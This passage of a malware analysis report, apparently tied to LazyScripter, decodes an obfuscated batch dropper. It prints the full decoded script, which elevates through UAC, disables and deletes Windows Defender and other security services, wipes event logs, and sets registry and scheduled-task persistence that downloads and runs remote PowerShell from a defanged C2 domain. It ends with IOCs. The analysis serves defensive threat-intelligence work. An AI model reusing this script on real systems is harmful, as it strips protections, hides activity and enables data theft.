%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%.%ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%.%pjdvllg%%bysdcmi%%flbzyhx%%fynwfvh%%dskbaxq%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%.%tjxpouf%%mkmhtbo%%mkmhtbo%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%%tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%%wegkoem%%brlbmmf%%brlbmmf%%mkmhtbo%%pjdvllg%%khoziql%%wegkoem%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%%dskbaxq%%jxdklrj%%wegkoem%%xlnlrpz%%tjxpouf%%khoziql%%ybbwhci%%brlbmmf%.%tjxpouf%%mkmhtbo%%mkmhtbo%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %rmyyyjm%%ybbwhci%%khoziql%%ybbwhci%%cbwqklh%%khoziql%.%tjxpouf%%mkmhtbo%%mkmhtbo%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %rmyyyjm%%ybbwhci%%khoziql%%ybbwhci%%cbwqklh%%khoziql%.%tjxpouf%%mkmhtbo%%mkmhtbo%.%hxiqvtv%%jxdklrj%%pjdvllg%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %rmyyyjm%%ybbwhci%%fynwfvh%%khoziql%%fynwfvh%%tjxpouf%%pjdvllg%%flbzyhx%.%tjxpouf%%mkmhtbo%%mkmhtbo%
%khoziql%%tjxpouf% %rmyyyjm%%pjdvllg%%bysdcmi%%fynwfvh%%cbwqklh%%flbzyhx%\%mkmhtbo%%nutqtmu%%dskbaxq%%ybbwhci%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%-%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%-%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%%4operational.evtx
del /f microsoft-windows-windows defender%4%rmyyyjm%%yvyapob%%khoziql%.%fynwfvh%%cbwqklh%%flbzyhx%%lxckycu%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%-%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%-%ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%-%wegkoem%%jxdklrj%%tjxpouf%%pjdvllg%%flbzyhx%-%khoziql%%nutqtmu%%bysdcmi%%gfuxihu%%pjdvllg%%dskbaxq%%jxdklrj%%xlnlrpz%%wegkoem%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%-%khoziql%%mkmhtbo%%pjdvllg%%fynwfvh%%bysdcmi%%flbzyhx%%4operational.evtx
del /f microsoft-windows-security-enterprisedata-filerevocationmanager%4%nutqtmu%%brlbmmf%%fynwfvh%%xlnlrpz%%wegkoem%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%%wegkoem%%mkmhtbo%.%fynwfvh%%cbwqklh%%flbzyhx%%lxckycu%
%tjxpouf%%fynwfvh%%mkmhtbo% /%gfuxihu% %hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%-%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%-%ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%-%bysdcmi%%fynwfvh%%flbzyhx%%mkmhtbo%%nutqtmu%%dskbaxq%%nutqtmu%%bysdcmi%
```
</p>
</details>

After replacing the "SET" variables with the corresponding char and doing one more replacement in Cyberchef results a clean and readable data and the whole data is available in dropdown.

![image](https://user-images.githubusercontent.com/71969773/167426557-63f38839-02c6-4227-b4d1-a96acaaba16c.png)

<details><summary>Decoded</summary>
<p>

```cmd
@echo off
NET SESSION >nul 2>&1 && goto noUAC
title.
set n=%0 %*
set n=%n:"=" ^& Chr(34) ^& "%
echo Set objShell = CreateObject("Shell.Application")>"%tmp%\cmdUAC.vbs"
echo objShell.ShellExecute "cmd.exe", "/c start " ^& Chr(34) ^& "." ^& Chr(34) ^& " /d " ^& Chr(34) ^& "%CD%" ^& Chr(34) ^& " cmd /c %n%", "", "runas", ^1>>"%tmp%\cmdUAC.vbs"
echo Not Admin, Attempting to elevate...
cscript "%tmp%\cmdUAC.vbs" //Nologo
del "%tmp%\cmdUAC.vbs"
exit /b
:noUAC

@echo off

reg delete "hklm\software\policies\microsoft\windows defender" /f
reg add "hklm\software\policies\microsoft\windows defender" /v "disableantispyware" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender" /v "disableantivirus" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\mpengine" /v "mpenablepus" /t reg_dword /d "0" /f
reg add "hklm\software\policies\microsoft\windows defender\real-time protection" /v "disablebehaviormonitoring" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\real-time protection" /v "disableioavprotection" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\real-time protection" /v "disableonaccessprotection" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\real-time protection" /v "disablerealtimemonitoring" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\real-time protection" /v "disablescanonrealtimeenable" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\reporting" /v "disableenhancednotifications" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\spynet" /v "disableblockatfirstseen" /t reg_dword /d "1" /f
reg add "hklm\software\policies\microsoft\windows defender\spynet" /v "spynetreporting" /t reg_dword /d "0" /f
reg add "hklm\software\policies\microsoft\windows defender\spynet" /v "submitsamplesconsent" /t reg_dword /d "0" /f
rem 0 - disable logging
reg add "hklm\system\currentcontrolset\control\wmi\autologger\defenderapilogger" /v "start" /t reg_dword /d "0" /f
reg add "hklm\system\currentcontrolset\control\wmi\autologger\defenderauditlogger" /v "start" /t reg_dword /d "0" /f
rem disable wd tasks
schtasks /change /tn "microsoft\windows\exploitguard\exploitguard mdm policy refresh" /disable
schtasks /change /tn "microsoft\windows\windows defender\windows defender cache maintenance" /disable
schtasks /change /tn "microsoft\windows\windows defender\windows defender cleanup" /disable
schtasks /change /tn "microsoft\windows\windows defender\windows defender scheduled scan" /disable
schtasks /change /tn "microsoft\windows\windows defender\windows defender verification" /disable
rem disable wd systray icon
reg delete "hklm\software\microsoft\windows\currentversion\explorer\startupapproved\run" /v "windows defender" /f
reg delete "hkcu\software\microsoft\windows\currentversion\run" /v "windows defender" /f
reg delete "hklm\software\microsoft\windows\currentversion\run" /v "windowsdefender" /f
rem remove wd context menu
reg delete "hkcr\*\shellex\contextmenuhandlers\epp" /f
reg delete "hkcr\directory\shellex\contextmenuhandlers\epp" /f
reg delete "hkcr\drive\shellex\contextmenuhandlers\epp" /f
rem disable wd services
reg add "hklm\system\currentcontrolset\services\wdboot" /v "start" /t reg_dword /d "4" /f
reg add "hklm\system\currentcontrolset\services\wdfilter" /v "start" /t reg_dword /d "4" /f
reg add "hklm\system\currentcontrolset\services\wdnisdrv" /v "start" /t reg_dword /d "4" /f
reg add "hklm\system\currentcontrolset\services\wdnissvc" /v "start" /t reg_dword /d "4" /f
reg add "hklm\system\currentcontrolset\services\windefend" /v "start" /t reg_dword /d "4" /f
reg add "hklm\system\currentcontrolset\services\securityhealthservice" /v "start" /t reg_dword /d "4" /f

reg[.]exe add hklm\software\microsoft\windows\currentversion\policies\system /v enablelua /t reg_dword /d 0 /f

reg add "hkey_current_user\software\microsoft\windows\currentversion\run" /v "#one" /t reg_sz /d "powershell -w hidden \"add-type -assemblyname system[.]core;iex (new-object net[.]webclient).downloadstring('hxxp[://]hpsj[.]firewall-gateway[.]net:80/hpjs[.]php');\"" /f

reg add "hkey_current_user\software\microsoft\windows\currentversion\run" /v "#oneupdate" /t reg_sz /d "powershell -w hidden \"add-type -assemblyname system[.]core;iex (new-object net[.]webclient).downloadstring('hxxp[://]hpsj[.]firewall-gateway[.]net:443/uddiexplorer');\"" /f

"c:\program files\microsoft security client\setup[.]exe" /x /s /disableoslimit

start /b powershell add-mppreference -exclusionpath "c:" -force

start /b powershell add-mppreference -exclusionpath "c:\users" -force

start /b powershell -w hidden "iex(new-object net[.]webclient).downloadstring('hxxp[://]hpsj[.]firewall-gateway[.]net:443/uddiexplorer');"
 
start /b powershell -w hidden "add-type -assemblyname system[.]core;iex (new-object net[.]webclient).downloadstring('hxxp[://]hpsj[.]firewall-gateway[.]net:80/hpjs[.]php');"


schtasks /create /sc minute /mo 60 /f /tn achromeupdater /tr "powershell -w hidden \"add-type -assemblyname system[.]core;iex (new-object net[.]webclient).downloadstring(''hxxp[://]hpsj[.]firewall-gateway[.]net:80/hpjs[.]php''');\""

schtasks /f /create /sc minute /mo 60 /tn achromeupdateri /tr "powershell[.]exe -w hidden 'iex (new-object net[.]webclient).downloadstring(''hxxp[://]hpsj[.]firewall-gateway[.]net:443/uddiexplorer''');'"

sc stop windefend
sc config windefend start= disabled
sc delete windefend
sc stop wdnissvc
sc config wdnissvc start= disabled
sc delete wdnissvc
sc stop sense
sc config sense start= disabled
sc delete sense
sc stop wuauserv
sc config wuauserv start= disabled
sc stop usosvc
sc config usosvc start= disabled
sc stop waasmedicsvc
sc config waasmedicsvc start= disabled
sc stop securityhealthservice
sc config securityhealthservice start= disabled
sc delete securityhealthservice
sc stop sdrsvc
sc config sdrsvc start= disabled
sc stop wscsvc
sc config wscsvc start= disabled
sc stop wdiservicehost
sc config wdiservicehost start= disabled
sc stop wdisystemhost
sc config wdisystemhost start= disabled
sc stop installservice
sc config installservice start= disabled
sc stop vaultsvc
sc config vaultsvc start= disabled
sc stop spooler
sc config spooler start= disabled
sc stop licensemanager
sc config licensemanager start= disabled
sc stop diagtrack
sc config diagtrack start= disabled
taskkill /f /im smartscreen[.]exe
taskkill /f /im securityhealthservice[.]exe
cd c:\
cd c:\program files\
rd /s /q "windows defender"
rd /s /q "windows defender advanced threat protection"
rd /s /q "windows security"
cd c:\program files (x86)\
rd /s /q "windows defender"
cd c:\programdata\microsoft
rd /s /q "windows defender"
rd /s /q "windows defender advanced threat protection"
rd /s /q "windows security health"
cd c:\
cd windows
cd system32
del /f windowsupdateelevatedinstaller[.]exe
del /f securityhealthsystray[.]exe
del /f securityhealthservice[.]exe
del /f securityhealthhost[.]exe
del /f securitycenterbroker[.]dll
del /f securitycenterbrokerps[.]dll
del /f securityhealthagent[.]dll
del /f securityhealthproxystub[.]dll
del /f securityhealthsso[.]dll
del /f smartscreensettings[.]exe
del /f smartscreenps[.]dll
del /f smartscreen[.]exe
del /f windows[.]security[.]integrity[.]dll
del /f windowsdefenderapplicationguardcsp[.]dll
del /f wscsvc[.]dll
del /f wscsvc[.]dll[.]mui
del /f wsecedit[.]dll
cd winevt\logs
del /f microsoft-windows-windows defender4operational[.]evtx
del /f microsoft-windows-windows defender4whc[.]evtx
del /f microsoft-windows-security-audit-configuration-client4operational[.]evtx
del /f microsoft-windows-security-enterprisedata-filerevocationmanager4operational[.]evtx
del /f microsoft-windows-security-netlogon
```
</p>
</details>

The decoded payload has capable of disabling lot and lots of security features, setting persistence using Registry and Scheduled Taks and downloading next stage payload from mentioned URLs.

**1.** *hxxp[://]hpsj[.]firewall-gateway[.]net:80/hpjs[.]php*

**2.** *hxxp[://]hpsj[.]firewall-gateway[.]net:443/uddiexplorer*

![image](https://user-images.githubusercontent.com/71969773/167432115-2419633f-1c06-42ad-a363-ee9a21d01ea1.png)

 **Final-Stage**
 
The final payload downloaded from above 1st URL is stealing users info such as (HostName, UserName, OS Architecture (32/64) & Verion, AD-Domain, System IP, Admin-check, enumerating all running process etc..) All these data are encrypted with **AES-CBC** and sent over to C2 server.


![image](https://user-images.githubusercontent.com/71969773/167436442-a3815b93-8edd-4bc3-80a0-74ba0b6357f4.png)

The response from C2 server is also an AES encrypted content and for reference the returned value "LquqiDE9NWlWMN6NCrXeJg==" (extracted from Anyrun) is decoded to be "False"

![image](https://user-images.githubusercontent.com/71969773/167438025-2b275aa0-2389-4413-bf61-b8564abf95e2.png)

Based on decoded value, the corresponding code block is going to be executed.

![image](https://user-images.githubusercontent.com/71969773/167563465-cb0eda23-f84d-4824-a744-c94c295ebbca.png)

Similar stealing behavior is noticed from 2nd URL as well. 

# IOC
| Description   | URL/Hash |
|:---- | :--:   | 
| PDF | 62610680349de97db658a7d41fc9a9b8  |
| ZIP (Dropper) | hxxp[://]128[.]199[.]7[.]40/PATCH%20CVE00456-2022[.]zip  | 
| Batch Script | 20e9e2e20425f5b89106f6bbace5381d |
| URL_Dropper_1 | hxxp[://]hpsj[.]firewall-gateway[.]net:80/hpjs[.]php | 
| URL_Dropper_2 | hxxp[://]hpsj[.]firewall-gateway[.]net:443/uddiexplorer | 
| C2 Server | hxxp[://]hpsj[.]firewall-gateway[.]net:443/operation |
| C2 Server | hxxp[://]hpsj[.]firewall-gateway[.]net:443/proxy |
| C2 Server | hxxp[://]hpsj[.]firewall-gateway[.]net:443/publish |
| C2 Server | hxxp[://]hpsj[.]firewall-gateway[.]net:443/publishing	|
|C2 Server | hxxp[://]hpsj[.]firewall-gateway[.]net:80/messages|

# References
[^1]: https://attack.mitre.org/groups/G0140/
[^2]: https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf
